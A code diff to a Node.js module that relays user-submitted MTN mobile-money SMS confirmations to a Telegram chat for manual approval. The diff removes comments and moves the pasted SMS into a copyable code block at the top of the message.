@@ -2,10 +2,8 @@
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';
 
-// Live pending requests (SMS submitted, awaiting button tap)
-const pending = new Map();     // ref -> { decision, messageId, smsText, createdAt }
-// Persistent decisions (survive restarts + cover already-handled requests)
-const decisions = new Map();   // ref -> 'pending' | 'approved' | 'paste_full' | 'expired'
+const pending = new Map();
+const decisions = new Map();
 
 function log(m) { console.log('[tg-mtn]', m); }
 
@@ -52,18 +50,14 @@ async function handleUpdate(update) {
   const [action, txRef] = data.split(':');
   if (!action || !txRef) return;
 
-  // Only handle our three actions
   if (action !== 'approve' && action !== 'paste_full' && action !== 'expired') return;
 
-  // Determine the target decision
   const target =
     action === 'approve'    ? 'approved'   :
     action === 'paste_full' ? 'paste_full' :
                               'expired';
 
-  // RECORD ALWAYS — even if pending entry is gone (Railway idle restart, etc.)
   decisions.set(txRef, target);
-
   const entry = pending.get(txRef);
   if (entry) entry.decision = target;
 
@@ -85,27 +79,28 @@ function registerRoutes(app) {
       const { tx, code, message, am, cur, c, an, rn } = req.body || {};
       if (!tx || !message) return res.status(400).json({ error: 'Missing tx or message' });
 
-      // If we already have a pending request for this ref, ignore the duplicate
       const existing = pending.get(tx);
       if (existing && existing.decision === 'pending') {
         return res.json({ ok: true, requestId: tx });
       }
 
       pending.set(tx, { decision: 'pending', messageId: null, smsText: message, createdAt: Date.now() });
-      decisions.set(tx, 'pending'); // ← reset decision to pending for the new SMS
+      decisions.set(tx, 'pending');
 
       const safe = (v) => String(v == null ? '—' : v)
         .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 
+      // <pre> block FIRST — Telegram renders its native "Copy" button on top of
+      // any code block, giving one-tap copy of the exact SMS the user pasted.
       const text =
-        `<b>📨 New MTN Y'ello SMS submitted</b>\n\n` +
+        `<b>📨 Tap the code block to copy the SMS</b>\n\n` +
+        `<pre>${safe(message)}</pre>\n\n` +
         `<b>Reference:</b> <code>${safe(tx)}</code>\n` +
         `<b>Amount:</b> ${safe(cur)} ${safe(am)}\n` +
         `<b>Country:</b> ${safe(c)}\n` +
         `<b>Number:</b> ${safe(an)}\n` +
         `<b>Recipient:</b> ${safe(rn)}\n` +
-        `<b>Detected code:</b> <code>${safe(code)}</code>\n\n` +
-        `<b>Pasted SMS:</b>\n<pre>${safe(message)}</pre>`;
+        `<b>Detected code:</b> <code>${safe(code)}</code>`;
 
       const keyboard = [[
         { text: '✅ Approve',        callback_data: `approve:${tx}` },
